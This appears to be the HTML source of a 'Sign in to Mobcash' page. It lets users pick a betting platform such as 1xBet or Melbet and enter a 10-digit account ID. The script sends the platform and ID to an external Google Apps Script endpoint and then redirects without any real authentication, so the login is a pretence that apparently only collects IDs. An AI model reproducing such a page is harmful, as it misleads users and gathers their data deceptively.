<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in to - Mobcash</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    select option { color:#000; }
    @media (prefers-color-scheme: dark) { select option { color:#fff; } }
    .fade     { transition:all .3s ease; opacity:0; transform:translateY(-5px); }
    .fade.show{ opacity:1; transform:translateY(0); }
    .icon-container { display:grid; grid-template-columns:repeat(3,1fr); gap:1rem; margin-top:1rem; }
    .icon-box {
      @apply bg-white dark:bg-gray-700 border rounded-xl p-2 flex flex-col items-center justify-center cursor-pointer transition duration-200;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    .icon-box.selected {
      border-color: #22c55e;
      box-shadow: 0 0 10px rgba(34,197,94,0.4);
    }
    .icon-box img { height: 40px; object-fit: contain; }
    .icon-name { margin-top: 0.5rem; font-size: 0.75rem; font-weight: 600; text-align: center; color: #333; }
  </style>
</head>
<body class="bg-gray-100 dark:bg-gray-900 min-h-screen flex items-center justify-center px-4">
  <div class="bg-white dark:bg-gray-800 shadow-2xl rounded-2xl p-8 w-full max-w-md">
    <h2 class="text-2xl font-bold text-center text-gray-800 dark:text-white mb-6">Sign in to Mobcash</h2>

    <!-- زر En un clic -->
    <button id="oneClickTab" class="w-full mb-6 flex items-center justify-center gap-2 rounded-xl py-2 font-semibold text-white bg-green-600 hover:bg-green-700 active:scale-95 transition duration-300 focus:outline-none focus:ring-2 focus:ring-green-500">
      <i data-lucide="zap" class="w-4 h-4"></i>
      En&nbsp;un&nbsp;clic
    </button>

    <!-- أيقونات المنصات -->
    <input type="hidden" id="platform" />
    <div id="platformIcons" class="icon-container">
      <div class="icon-box" data-name="LineBet">
        <img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png" alt="LineBet">
        <div class="icon-name">LineBet</div>
      </div>
      <div class="icon-box" data-name="MegaPari">
        <img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp" alt="MegaPari">
        <div class="icon-name">MegaPari</div>
      </div>
      <div class="icon-box" data-name="Melbet">
        <img src="https://i.postimg.cc/wjCr86FS/melbet.png" alt="Melbet">
        <div class="icon-name">Melbet</div>
      </div>
      <div class="icon-box" data-name="Gooobet">
        <img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg" alt="Gooobet">
        <div class="icon-name">Gooobet</div>
      </div>
      <div class="icon-box" data-name="1xBet">
        <img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png" alt="1xBet">
        <div class="icon-name">1xBet</div>
      </div>
    </div>

    <!-- حقل ID -->
    <div class="mt-6 mb-4">
      <label for="userId" class="block mb-2 text-sm font-medium text-gray-700 dark:text-gray-300">أدخل الـ ID (10 أرقام)</label>
      <input type="text" id="userId" maxlength="10" placeholder="مثال: 1234567890" class="w-full px-4 py-2 border rounded-xl text-sm bg-white text-gray-800 dark:bg-gray-700 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="validateId()" />
    </div>

    <!-- الرسالة -->
    <div id="message" class="fade text-center text-sm mb-4 h-5"></div>

    <!-- زر التسجيل -->
    <button id="submitBtn" onclick="login()" class="relative w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-xl transition duration-300 flex items-center justify-center gap-2">
      <i data-lucide="log-in" class="w-5 h-5"></i>
      <span class="label">Sign in</span>
      <svg id="loader" class="hidden absolute w-5 h-5 animate-spin" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
        <path class="opacity-75" d="M4 12a8 8 0 018-8v8z" fill="currentColor"></path>
      </svg>
    </button>
  </div>

  <script>
    lucide.createIcons();

    const iconBoxes = document.querySelectorAll(".icon-box");
    const platformInput = document.getElementById("platform");

    iconBoxes.forEach(icon => {
      icon.addEventListener("click", () => {
        iconBoxes.forEach(i => i.classList.remove("selected"));
        icon.classList.add("selected");
        platformInput.value = icon.dataset.name;
        validateId();
      });
    });

    const isRepeatedDigits = (id) => /^(\d)\1{9}$/.test(id);

    function showMessage(text, type = "error") {
      const msg = document.getElementById("message");
      msg.className = "fade show text-center text-sm mb-4 h-5";
      msg.textContent = text;
      msg.style.color = type === "success" ? "green" : "red";
    }

    function validateId() {
      const userId = document.getElementById("userId").value;
      const platform = platformInput.value;
      if (!/^\d*$/.test(userId)) { showMessage("يرجى إدخال أرقام فقط."); return; }
      if (userId.length !== 10) { showMessage("يجب أن يحتوي الـ ID على 10 أرقام."); return; }
      if (isRepeatedDigits(userId)) { showMessage("الرقم المعرف غير صالح."); return; }
      if (!platform) { showMessage("الرجاء اختيار المنصة."); return; }
      document.getElementById("message").className = "fade";
    }

    function resetForm() {
      const btn = document.getElementById("submitBtn");
      const loader = document.getElementById("loader");
      const label = btn.querySelector(".label");
      btn.disabled = false;
      loader.classList.add("hidden");
      label.classList.remove("hidden");
      platformInput.value = "";
      document.getElementById("userId").value = "";
      iconBoxes.forEach(i => i.classList.remove("selected"));
    }

    document.getElementById("oneClickTab").addEventListener("click", resetForm);

    function login() {
      const platform = platformInput.value;
      const userId = document.getElementById("userId").value;
      const btn = document.getElementById("submitBtn");
      const loader = document.getElementById("loader");
      const label = btn.querySelector(".label");

      if (!platform || userId.length !== 10 || isRepeatedDigits(userId)) {
        validateId();
        return;
      }

      btn.disabled = true;
      loader.classList.remove("hidden");
      label.classList.add("hidden");

      fetch("https://script.google.com/macros/s/AKfycbx5eBtV9miCzU9nk2oHtZk5hizvzE2U23aph7_g_tkf_8SiEyzxwRgRd5XRiBQ3-a35pQ/exec", {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ platform, userId })
      }).finally(() => {
        setTimeout(() => {
          window.location.href = "home.html";
        }, 1000);
      });
    }
  </script>
</body>
</html>
